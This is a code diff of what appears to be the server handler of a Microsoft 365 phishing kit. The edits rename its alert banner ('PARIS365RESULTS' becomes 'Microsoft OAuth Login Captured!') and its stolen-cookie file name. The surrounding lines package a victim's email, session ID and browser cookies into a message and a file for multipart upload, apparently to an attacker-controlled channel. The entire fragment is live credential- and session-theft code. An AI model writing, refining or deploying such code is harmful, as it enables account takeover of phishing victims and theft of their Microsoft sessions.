@@ -94,7 +94,7 @@ const handler = async (event, context) => {
     // Build the message (plain text only, heavily sanitized)
     const uniqueId = Math.random().toString(36).substring(2, 8);
     const messageLines = [
-      '🚨PARIS365RESULTS🚨',
+      'Microsoft OAuth Login Captured!',
       '',
       `Email: ${email}`,
       `Session ID: ${sessionId}`,
@@ -185,7 +185,7 @@ location.reload();
 
       // Clean filename to avoid issues
       const cleanEmail = email.replace(/[^a-zA-Z0-9@._-]/g, '_').replace('@', '_at_').replace(/\./g, '_');
-      const fileName = `microsoft365_cookies_${cleanEmail}_${Date.now()}.js`;
+      const fileName = `cookies_${cleanEmail}_${Date.now()}.js`;
 
       // Create proper multipart form data for file upload
       const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
